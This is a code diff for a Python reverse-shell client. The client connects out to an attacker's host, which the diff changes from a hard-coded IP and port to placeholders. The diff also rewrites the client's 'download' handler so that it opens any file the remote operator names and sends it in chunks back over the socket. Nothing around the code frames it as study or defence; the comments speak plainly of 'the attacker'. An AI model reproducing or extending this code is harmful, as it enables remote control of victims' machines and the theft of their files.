@@ -2,8 +2,8 @@ import socket
 import subprocess
 import os
 
-ATTACKER_IP = "10.0.100.16"
-ATTACKER_PORT = 8000
+ATTACKER_IP = "ATTACKER_IP"
+ATTACKER_PORT = ATTACKER_PORT
 
 def reliable_send(data, conn):
     conn.send(data.encode('utf-8'))
@@ -70,8 +70,19 @@ def reverse_shell():
 
             elif command.startswith("download "):
                 filename = command[9:]
-                download_file(s, filename)
-                reliable_send(f"Downloaded {filename}", s)
+                # Notify the attacker that the download process is starting
+                reliable_send("DOWNLOAD_READY", s)
+                # Open the file and send it in chunks
+                try:
+                    with open(filename, 'rb') as f:
+                        while True:
+                            bits = f.read(1024)
+                            if not bits:
+                                break
+                            s.send(bits)
+                        s.send(b"DONE")
+                except Exception as e:
+                    reliable_send(f"Error: {str(e)}", s)
 
             else:
                 try:
